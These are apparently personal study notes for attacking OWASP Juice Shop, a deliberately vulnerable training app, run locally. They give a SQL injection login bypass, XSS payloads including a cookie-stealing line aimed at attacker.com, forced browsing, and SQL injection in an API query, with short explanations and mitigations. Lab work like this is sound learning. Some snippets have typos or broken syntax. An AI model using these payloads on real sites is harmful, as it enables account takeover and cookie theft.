# get the project from the GitHub
```Bash
git@github.com:shiyinxli/practice.git
```

```Bash
cd juice-shop
```

# Run juice-shop locally
```Bash
node -v
npm install
npm start
```
go to `http://localhost:3000`
# Attack: Login bypass(SQL injection)
## 1. open the login page
## 2. enter this payload
email: `' OR 1=1--`
password: anything

what should happen: you will be logged in without a real account
## 3. why this works
the backend might build a query like:
```sql
SELECT * FROM users WHERE email = 'INPUT' AND password = 'INPUT'
```
and the input turns it into something like:
```sql
WHERE email = '' OR 1=1--' AND password = '...'
```
`1=1` is always true
`--` comments out the rest
result: login succeeds
# find score board
## why score board matters
in owasp juice shop, the score board is basically
- a mission list
- a progress tracker
- a learning roadmap

## try a targeted guess
manually go to:
`http://localhost:3000/#/score-board`
Juice shop is a single-page app (SPA)
that means:
- `#/something` = internal route
- developers may hide it in UI, but not protect it
this is a real-world issue: security through obscurity = broken security
this is called **forced browsing/directory guessing**
# XSS attack
## what is XSS
you inject JavaScript into a website, and it runs in the victim's browser.
instead of: normal input -> text
you do: input -> code execution
## steps
- go to the search bar
- paste this into the search `<script>alert('XSS')</script>
- press enter
- if vulnerable: a popup appears saying XSS
## why this works
a vulnerable app might do something like:
```html
<div>You searched for: <USER_INPUT></div>
```
after inserting your input, it becomes:
```html
<div>You searched for: <script>alter('XSS')</script></div>
```
browsers don't treat `<script>` as text, they execute it.
so instead of displaying it, the browser runs:
```js
alter('XSS')
```
popup appears
## learned from it
- how browsers execute HTML + JS
- how user input becomes dangerous
- why sanitization matters
# turn XSS into data exfiltration
with cross-site scripting, attackers often:
- steal cookies
- steal tokens
- send data to their own server
## try to read cookies
in the search bar, try:
```html
<img src=x onerror=alert(document.cookie)>
```
real attackers don't use `alert()`
they do send cookies to the attack server, example:
```html
<img src="http://attacker.com/steal?c=" + document.cookie>
```
## measures against it
- HttpOnly cookies (not accessible via JS)
- Input sanitization
- Output encoding
# use DevTools to discover hidden APIs
in real applications, the frontend talks to a backend via APIs, and many vulnerabilities are found there.
## steps
- open developer tools: in browser, press F12, go to the Network tab
- filter requests: at the top, click "XHR" or "Fetch", this shows API calls only.
- trigger APIs: go back to Juice Shop page and refresh the page OR search something OR log in/out
- you should see a list of requests, click on one request, look at Headers (URL, Method(GET/POST)), response (JSON data returned).
- if an API is a get request like `/rest/products/search?q=apple`:
    - you can copy it in the DevTools and paste it in the browser and mortify it. like `/rest/products/search?q=' OR 1=1--`
